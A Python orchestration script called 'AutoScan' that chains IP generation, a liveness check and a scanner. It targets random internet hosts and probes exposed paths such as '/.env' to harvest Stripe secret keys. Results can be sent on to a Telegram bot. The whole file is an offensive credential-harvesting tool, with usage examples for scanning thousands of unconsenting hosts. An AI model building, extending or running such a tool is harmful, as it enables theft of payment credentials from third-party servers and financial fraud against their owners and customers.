#!/usr/bin/env python3
# _*_ coding: utf-8 _*_
"""
AutoScan - Automated IP Generation, Live Check, and Stripe Scanner
Combines ipgen.py → checklive.py → code.py workflow
"""

import os
import sys
import time
import subprocess
import argparse
from datetime import datetime
from colorama import Fore, init

init(autoreset=True)

# Colors
RED = Fore.LIGHTRED_EX
GREEN = Fore.LIGHTGREEN_EX
YELLOW = Fore.LIGHTYELLOW_EX
BLUE = Fore.LIGHTBLUE_EX
CYAN = Fore.LIGHTCYAN_EX
MAGENTA = Fore.LIGHTMAGENTA_EX
RESET = Fore.RESET

class AutoScan:
    def __init__(self):
        self.session_dir = f"autoscan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.ip_file = None
        self.live_file = None
        self.stats = {
            'ips_generated': 0,
            'ips_live': 0,
            'ips_dead': 0,
            'stripe_found': 0,
            'start_time': None,
            'end_time': None
        }

    def print_banner(self):
        """Print banner"""
        print(GREEN + r'''
    ╔══════════════════════════════════════════════════════════════╗
    ║           🤖 AutoScan - Automated Stripe Scanner 🤖         ║
    ║                                                              ║
    ║  Workflow: Generate IPs → Check Live → Scan Stripe Keys    ║
    ╚══════════════════════════════════════════════════════════════╝
        ''' + RESET)

    def create_session_dir(self):
        """Create session directory"""
        try:
            os.makedirs(self.session_dir, exist_ok=True)
            print(f"{BLUE}[+] Session directory created: {self.session_dir}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Error creating session directory: {str(e)}{RESET}")
            return False

    def run_command(self, cmd, description):
        """Run a command and show progress"""
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{YELLOW}[>] {description}{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        print(f"{BLUE}Command: {' '.join(cmd)}{RESET}\n")

        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            # Stream output in real-time
            for line in process.stdout:
                print(line, end='')

            process.wait()

            if process.returncode == 0:
                print(f"\n{GREEN}[✓] {description} completed successfully{RESET}")
                return True
            else:
                print(f"\n{RED}[✗] {description} failed with code {process.returncode}{RESET}")
                return False

        except Exception as e:
            print(f"\n{RED}[✗] Error running command: {str(e)}{RESET}")
            return False

    def generate_ips(self, count, add_env=False):
        """Step 1: Generate IPs"""
        self.ip_file = os.path.join(self.session_dir, 'generated_ips.txt')

        cmd = ['python3', 'ipgen.py', '--random', str(count), '-o', self.ip_file]
        if add_env:
            cmd.append('--env')

        if self.run_command(cmd, f"Generating {count} IPs"):
            self.stats['ips_generated'] = count
            return True
        return False

    def check_live(self, threads=10, timeout=5):
        """Step 2: Check live IPs"""
        if not self.ip_file or not os.path.exists(self.ip_file):
            print(f"{RED}[-] IP file not found!{RESET}")
            return False

        cmd = [
            'python3', 'checklive.py',
            '--list', self.ip_file,
            '--threads', str(threads),
            '--timeout', str(timeout)
        ]

        if self.run_command(cmd, f"Checking live IPs (threads={threads})"):
            # Read live/dead counts from Results
            self.live_file = 'Results/live.txt'

            try:
                if os.path.exists('Results/live.txt'):
                    with open('Results/live.txt', 'r') as f:
                        self.stats['ips_live'] = len(f.readlines())

                if os.path.exists('Results/dead.txt'):
                    with open('Results/dead.txt', 'r') as f:
                        self.stats['ips_dead'] = len(f.readlines())
            except:
                pass

            if self.stats['ips_live'] == 0:
                print(f"{YELLOW}[!] No live IPs found. Scan aborted.{RESET}")
                return False

            return True
        return False

    def scan_stripe(self, threads=10, path_file=None, telegram_token=None, telegram_chat_id=None):
        """Step 3: Scan for Stripe keys"""
        if not self.live_file or not os.path.exists(self.live_file):
            print(f"{RED}[-] Live IP file not found!{RESET}")
            return False

        cmd = [
            'python3', 'code.py',
            '--list', self.live_file,
            '--threads', str(threads)
        ]

        # Add optional arguments
        if path_file:
            cmd.extend(['--path-file', path_file])

        if telegram_token and telegram_chat_id:
            cmd.extend(['--telegram-bot-token', telegram_token])
            cmd.extend(['--telegram-chat-id', telegram_chat_id])

        if self.run_command(cmd, f"Scanning for Stripe keys (threads={threads})"):
            # Read Stripe results
            try:
                if os.path.exists('Results/logsites/stripesite.txt'):
                    with open('Results/logsites/stripesite.txt', 'r') as f:
                        self.stats['stripe_found'] = len(f.readlines())
            except:
                pass

            return True
        return False

    def print_summary(self):
        """Print final summary"""
        duration = self.stats['end_time'] - self.stats['start_time']

        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{GREEN}{'='*60}")
        print(f"           🎉 AutoScan Completed! 🎉")
        print(f"{'='*60}{RESET}\n")

        print(f"{BLUE}Session Directory:{RESET} {self.session_dir}")
        print(f"{BLUE}Duration:{RESET} {duration:.2f} seconds ({duration/60:.2f} minutes)\n")

        print(f"{YELLOW}📊 Statistics:{RESET}")
        print(f"  {CYAN}IPs Generated:{RESET} {self.stats['ips_generated']:,}")
        print(f"  {GREEN}IPs Live:{RESET} {self.stats['ips_live']:,} ({self.stats['ips_live']/self.stats['ips_generated']*100 if self.stats['ips_generated'] > 0 else 0:.2f}%)")
        print(f"  {RED}IPs Dead:{RESET} {self.stats['ips_dead']:,} ({self.stats['ips_dead']/self.stats['ips_generated']*100 if self.stats['ips_generated'] > 0 else 0:.2f}%)")
        print(f"  {MAGENTA}🔑 Stripe Keys Found:{RESET} {self.stats['stripe_found']}\n")

        print(f"{YELLOW}📁 Result Files:{RESET}")
        if os.path.exists('Results/STRIPE.txt'):
            print(f"  {GREEN}✓{RESET} Results/STRIPE.txt - Stripe keys found")
        if os.path.exists('Results/live.txt'):
            print(f"  {GREEN}✓{RESET} Results/live.txt - Live IPs")
        if os.path.exists('Results/dead.txt'):
            print(f"  {GREEN}✓{RESET} Results/dead.txt - Dead IPs")
        if os.path.exists('Results/scan.log'):
            print(f"  {GREEN}✓{RESET} Results/scan.log - Detailed scan log")

        print(f"\n{CYAN}{'='*60}{RESET}\n")

    def run(self, args):
        """Run the full workflow"""
        self.print_banner()

        # Create session directory
        if not self.create_session_dir():
            return False

        self.stats['start_time'] = time.time()

        # Step 1: Generate IPs
        print(f"\n{MAGENTA}[STEP 1/3] Generating IPs...{RESET}")
        if not self.generate_ips(args.count, add_env=args.env):
            print(f"{RED}[✗] Failed to generate IPs{RESET}")
            return False

        # Step 2: Check Live
        print(f"\n{MAGENTA}[STEP 2/3] Checking Live IPs...{RESET}")
        if not self.check_live(threads=args.live_threads, timeout=args.timeout):
            print(f"{RED}[✗] Failed to check live IPs or no live IPs found{RESET}")
            return False

        # Step 3: Scan Stripe
        print(f"\n{MAGENTA}[STEP 3/3] Scanning for Stripe Keys...{RESET}")
        if not self.scan_stripe(
            threads=args.scan_threads,
            path_file=args.path_file,
            telegram_token=args.telegram_token,
            telegram_chat_id=args.telegram_chat_id
        ):
            print(f"{RED}[✗] Failed to scan for Stripe keys{RESET}")
            return False

        self.stats['end_time'] = time.time()

        # Print summary
        self.print_summary()

        return True


def main():
    parser = argparse.ArgumentParser(
        description='AutoScan - Automated IP Generation, Live Check, and Stripe Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Basic scan with 1000 IPs
  python autoscan.py --count 1000

  # Scan with 5000 IPs, 20 threads for checking, 15 for scanning
  python autoscan.py --count 5000 --live-threads 20 --scan-threads 15

  # Scan with path file (500+ paths) and Telegram notifications
  python autoscan.py --count 10000 --path-file path.txt \\
    --telegram-token "YOUR_TOKEN" --telegram-chat-id "YOUR_CHAT_ID"

  # Quick scan with higher timeout
  python autoscan.py --count 500 --timeout 10

  # Generate IPs with /.env suffix
  python autoscan.py --count 1000 --env
        '''
    )

    # Required arguments
    parser.add_argument('--count', '-c', type=int, required=True,
                        help='Number of IPs to generate')

    # Optional arguments
    parser.add_argument('--env', action='store_true',
                        help='Add /.env to generated IPs')
    parser.add_argument('--live-threads', type=int, default=10,
                        help='Threads for live checking (default: 10)')
    parser.add_argument('--scan-threads', type=int, default=10,
                        help='Threads for scanning (default: 10)')
    parser.add_argument('--timeout', type=float, default=5.0,
                        help='Timeout for live checking (default: 5.0)')
    parser.add_argument('--path-file', type=str,
                        help='Path file for comprehensive scanning (e.g., path.txt)')
    parser.add_argument('--telegram-token', type=str,
                        help='Telegram bot token for notifications')
    parser.add_argument('--telegram-chat-id', type=str,
                        help='Telegram chat ID for notifications')

    args = parser.parse_args()

    # Validate
    if args.count <= 0:
        print(f"{RED}Error: Count must be greater than 0{RESET}")
        sys.exit(1)

    if (args.telegram_token and not args.telegram_chat_id) or \
       (not args.telegram_token and args.telegram_chat_id):
        print(f"{RED}Error: Both --telegram-token and --telegram-chat-id are required for Telegram notifications{RESET}")
        sys.exit(1)

    # Run AutoScan
    scanner = AutoScan()
    try:
        success = scanner.run(args)
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{RED}[!] Fatal error: {str(e)}{RESET}")
        sys.exit(1)


if __name__ == '__main__':
    main()
